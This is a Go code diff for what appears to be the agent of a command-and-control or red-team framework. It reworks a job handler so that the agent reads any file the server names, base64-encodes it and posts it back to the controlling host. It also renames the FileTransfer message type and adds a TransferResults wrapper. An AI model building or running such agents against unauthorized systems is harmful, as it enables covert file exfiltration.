@@ -197,8 +197,8 @@ func (n *node) continueCheckIn(j messages.Base, payload json.RawMessage, host st
 	var c messages.CmdResults
 
 	switch j.Type {
-	case "FileTransfer":
-		var p messages.FileTransfer
+	case "Transfer":
+		var p messages.Transfer
 		json.Unmarshal(payload, &p)
 
 		if p.IsDownload {
@@ -228,42 +228,42 @@ func (n *node) continueCheckIn(j messages.Base, payload json.RawMessage, host st
 			}
 			k, _ := json.Marshal(c)
 			b = prepareCmdResults(j.ID, k)
-
-			if !p.IsDownload {
-				fileData, err := ioutil.ReadFile(p.FileLocation)
-				if err != nil {
-					msg := fmt.Sprintf("There was an error reading %s\r\n", p.FileLocation)
-					msg += err.Error()
-					c := messages.CmdResults{
-						Job:    p.Job,
-						Stderr: msg,
-					}
-
-					k, _ := json.Marshal(c)
-					b = prepareCmdResults(j.ID, k)
-				} else {
-					fileHash := sha1.New()
-					io.WriteString(fileHash, string(fileData))
-
-					f := messages.FileTransfer{
-						FileLocation: p.FileLocation,
-						FileBlob:     base64.StdEncoding.EncodeToString([]byte(fileData)),
-						IsDownload:   true,
-						Job:          p.Job,
-					}
-					k, _ := json.Marshal(f)
-					b = prepareCmdResults(j.ID, k)
-				}
-			}
-			b2 := new(bytes.Buffer)
-			json.NewEncoder(b2).Encode(b)
-			resp2, err := n.Client.Post(host, "application/json; charset=utf-8", b2)
+		}
+		if !p.IsDownload {
+			fileData, err := ioutil.ReadFile(p.FileLocation)
 			if err != nil {
-				log.Panic(err)
+				msg := fmt.Sprintf("There was an error reading %s\r\n", p.FileLocation)
+				msg += err.Error()
+				c := messages.CmdResults{
+					Job:    p.Job,
+					Stderr: msg,
+				}
+
+				k, _ := json.Marshal(c)
+				b = prepareCmdResults(j.ID, k)
+			} else {
+				fileHash := sha1.New()
+				io.WriteString(fileHash, string(fileData))
+
+				f := messages.Transfer{
+					FileLocation: p.FileLocation,
+					FileBlob:     base64.StdEncoding.EncodeToString([]byte(fileData)),
+					IsDownload:   true,
+					Job:          p.Job,
+				}
+				k, _ := json.Marshal(f)
+				b = prepareTransferResults(j.ID, k)
+
 			}
-			if resp2.StatusCode != 200 {
-				log.Println("Error", resp2.StatusCode)
-			}
+		}
+		b2 := new(bytes.Buffer)
+		json.NewEncoder(b2).Encode(b)
+		resp2, err := n.Client.Post(host, "application/json; charset=utf-8", b2)
+		if err != nil {
+			log.Panic(err)
+		}
+		if resp2.StatusCode != 200 {
+			log.Println("Error", resp2.StatusCode)
 		}
 
 	case "CmdPayload":
@@ -293,6 +293,14 @@ func prepareCmdResults(id uuid.UUID, payload json.RawMessage) messages.Base {
 	return messages.Base{
 		ID:      id,
 		Type:    "CmdResults",
+		Payload: (*json.RawMessage)(&payload),
+	}
+}
+
+func prepareTransferResults(id uuid.UUID, payload json.RawMessage) messages.Base {
+	return messages.Base{
+		ID:      id,
+		Type:    "TransferResults",
 		Payload: (*json.RawMessage)(&payload),
 	}
 }
